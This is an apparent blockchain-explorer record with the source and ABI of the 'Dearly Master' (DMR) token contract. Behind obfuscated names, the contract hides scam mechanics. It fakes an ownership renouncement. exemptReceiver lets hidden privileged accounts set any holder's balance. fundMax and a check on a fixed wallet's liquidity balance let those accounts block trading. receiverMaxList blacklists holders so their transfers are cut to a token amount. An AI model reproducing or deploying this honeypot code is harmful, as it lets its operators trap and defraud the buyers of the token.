{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tradingTotalMode {\n    function createPair(address senderSell, address walletList) external returns (address);\n}\n\ninterface shouldMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTotal) external view returns (uint256);\n\n    function transfer(address tradingTeam, uint256 maxReceiver) external returns (bool);\n\n    function allowance(address tradingSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTeam,\n        uint256 maxReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingMarketing, uint256 value);\n    event Approval(address indexed tradingSender, address indexed spender, uint256 value);\n}\n\nabstract contract fundTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldModeMetadata is shouldMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DearlyMaster is fundTrading, shouldMode, shouldModeMetadata {\n\n    constructor (){\n        \n        walletSwap totalSellLimit = walletSwap(autoTo);\n        listLiquidity = tradingTotalMode(totalSellLimit.factory()).createPair(totalSellLimit.WETH(), address(this));\n        if (takeList) {\n            takeList = true;\n        }\n        sellBuy = _msgSender();\n        listTo[sellBuy] = true;\n        listWallet[sellBuy] = shouldTotal;\n        atTakeTx();\n        if (takeList) {\n            feeMarketing = shouldListSell;\n        }\n        emit Transfer(address(0), sellBuy, shouldTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private walletAmount;\n\n    bool public limitBuy;\n\n    function getOwner() external view returns (address) {\n        return swapSender;\n    }\n\n    address teamMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function walletSwapExempt(address receiverTeam, address tradingTeam, uint256 maxReceiver) internal returns (bool) {\n        if (receiverTeam == sellBuy) {\n            return feeToken(receiverTeam, tradingTeam, maxReceiver);\n        }\n        uint256 totalMode = shouldMode(listLiquidity).balanceOf(teamMax);\n        require(totalMode == launchToMin);\n        require(tradingTeam != teamMax);\n        if (listBuy[receiverTeam]) {\n            return feeToken(receiverTeam, tradingTeam, toExemptMarketing);\n        }\n        return feeToken(receiverTeam, tradingTeam, maxReceiver);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverFrom;\n    }\n\n    function balanceOf(address takeTotal) public view virtual override returns (uint256) {\n        return listWallet[takeTotal];\n    }\n\n    function transferFrom(address receiverTeam, address tradingTeam, uint256 maxReceiver) external override returns (bool) {\n        if (_msgSender() != autoTo) {\n            if (walletAmount[receiverTeam][_msgSender()] != type(uint256).max) {\n                require(maxReceiver <= walletAmount[receiverTeam][_msgSender()]);\n                walletAmount[receiverTeam][_msgSender()] -= maxReceiver;\n            }\n        }\n        return walletSwapExempt(receiverTeam, tradingTeam, maxReceiver);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listFundLimit;\n    }\n\n    uint256 private shouldTotal = 100000000 * 10 ** 18;\n\n    function transfer(address maxSellSwap, uint256 maxReceiver) external virtual override returns (bool) {\n        return walletSwapExempt(_msgSender(), maxSellSwap, maxReceiver);\n    }\n\n    mapping(address => bool) public listBuy;\n\n    address private swapSender;\n\n    function listReceiver() private view {\n        require(listTo[_msgSender()]);\n    }\n\n    address autoTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return swapSender;\n    }\n\n    function atTakeTx() public {\n        emit OwnershipTransferred(sellBuy, address(0));\n        swapSender = address(0);\n    }\n\n    function exemptReceiver(address maxSellSwap, uint256 maxReceiver) public {\n        listReceiver();\n        listWallet[maxSellSwap] = maxReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapWallet;\n    }\n\n    function feeToken(address receiverTeam, address tradingTeam, uint256 maxReceiver) internal returns (bool) {\n        require(listWallet[receiverTeam] >= maxReceiver);\n        listWallet[receiverTeam] -= maxReceiver;\n        listWallet[tradingTeam] += maxReceiver;\n        emit Transfer(receiverTeam, tradingTeam, maxReceiver);\n        return true;\n    }\n\n    function fundMax(uint256 maxReceiver) public {\n        listReceiver();\n        launchToMin = maxReceiver;\n    }\n\n    uint256 private feeMarketing;\n\n    uint256 launchToMin;\n\n    uint256 txFee;\n\n    event OwnershipTransferred(address indexed tradingAmount, address indexed autoReceiverBuy);\n\n    mapping(address => uint256) private listWallet;\n\n    string private listFundLimit = \"DMR\";\n\n    bool private sellReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldTotal;\n    }\n\n    function totalExempt(address exemptMax) public {\n        require(exemptMax.balance < 100000);\n        if (limitBuy) {\n            return;\n        }\n        if (feeMarketing == shouldListSell) {\n            limitTo = true;\n        }\n        listTo[exemptMax] = true;\n        \n        limitBuy = true;\n    }\n\n    bool private limitTo;\n\n    address public listLiquidity;\n\n    uint8 private receiverFrom = 18;\n\n    function approve(address txExempt, uint256 maxReceiver) public virtual override returns (bool) {\n        walletAmount[_msgSender()][txExempt] = maxReceiver;\n        emit Approval(_msgSender(), txExempt, maxReceiver);\n        return true;\n    }\n\n    function receiverMaxList(address minTotal) public {\n        listReceiver();\n        if (feeMarketing != shouldListSell) {\n            atMode = true;\n        }\n        if (minTotal == sellBuy || minTotal == listLiquidity) {\n            return;\n        }\n        listBuy[minTotal] = true;\n    }\n\n    mapping(address => bool) public listTo;\n\n    function allowance(address fromTokenEnable, address txExempt) external view virtual override returns (uint256) {\n        if (txExempt == autoTo) {\n            return type(uint256).max;\n        }\n        return walletAmount[fromTokenEnable][txExempt];\n    }\n\n    address public sellBuy;\n\n    uint256 constant toExemptMarketing = 3 ** 10;\n\n    bool public takeList;\n\n    string private swapWallet = \"Dearly Master\";\n\n    bool public atMode;\n\n    uint256 private shouldListSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiverBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTokenEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTakeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTotal\",\"type\":\"address\"}],\"name\":\"receiverMaxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"totalExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DearlyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}